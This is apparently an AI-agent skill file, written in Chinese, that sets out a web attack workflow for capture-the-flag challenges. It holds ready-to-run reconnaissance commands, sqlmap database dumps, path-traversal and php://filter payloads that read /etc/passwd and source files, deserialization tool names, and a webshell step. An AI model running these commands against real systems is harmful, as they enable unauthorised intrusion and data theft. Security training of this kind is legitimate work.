---
name: web
description: Web 安全测试。覆盖 SQL 注入、XSS、SSRF、文件上传、反序列化、目录穿越、认证绕过等 Web 漏洞的侦察与利用。
---

# Web 安全攻击流程

## 侦察阶段
```bash
nmap -sV -sC $TARGET -p 1-10000
whatweb http://$TARGET
gobuster dir -u http://$TARGET -w /usr/share/wordlists/common.txt -x php,html,txt,bak
nikto -h http://$TARGET
```

## 漏洞探测优先级
1. 登录页面 → SQLi / 弱口令 / 认证绕过
2. 文件上传 → webshell / 绕过检测
3. 参数注入 → SQLi / SSRF / SSTI / LFI
4. API 端点 → 未授权访问 / IDOR
5. 框架指纹 → 已知 CVE

## SQL 注入
```bash
sqlmap -u "http://$TARGET/page?id=1" --batch --dbs
sqlmap -u "http://$TARGET/page?id=1" -D dbname --dump
```

## 文件包含 / 目录穿越
```bash
curl "http://$TARGET/read?file=../../../../etc/passwd"
curl "http://$TARGET/read?file=php://filter/convert.base64-encode/resource=index.php"
```

## 反序列化
- Java: ysoserial / JNDI-Injection-Exploit
- PHP: 构造 POP 链
- Python: pickle.loads 利用

## 关键规则
- 拿到 webshell 后立即找 flag: `find / -name "flag*" 2>/dev/null`
- 数据库里找 flag: `SELECT * FROM flag;` 或 `SHOW TABLES;`
- 环境变量: `env | grep -i flag`
